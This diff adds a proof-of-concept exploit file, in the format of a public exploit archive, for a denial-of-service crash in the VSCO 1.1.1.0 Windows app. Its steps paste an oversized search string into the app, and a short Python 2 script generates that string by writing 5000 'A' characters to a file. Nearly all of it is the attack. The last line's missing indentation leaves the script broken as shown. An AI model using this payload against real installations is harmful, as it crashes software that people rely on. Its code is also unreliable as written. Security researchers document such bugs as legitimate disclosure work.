@@ -1,0 +1,26 @@
+# Exploit Title: VSCO 1.1.1.0 - Denial of Service (PoC)
+# Date: 2/14/2018
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://www.microsoft.com/store/productId/9NC1RLNH76PB
+# Version: 1.1.1.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# Run the python script, it will create a new file "PoC.txt"
+# Copy the text from the generated PoC.txt file to clipboard
+# Paste the text in the top right search bar and hit Search
+# Click back to Home
+# App will now crash
+
+buffer = "A" * 5000
+payload = buffer
+try:
+    f=open("PoC.txt","w")
+    print "[+] Creating %s evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+print "File cannot be created"
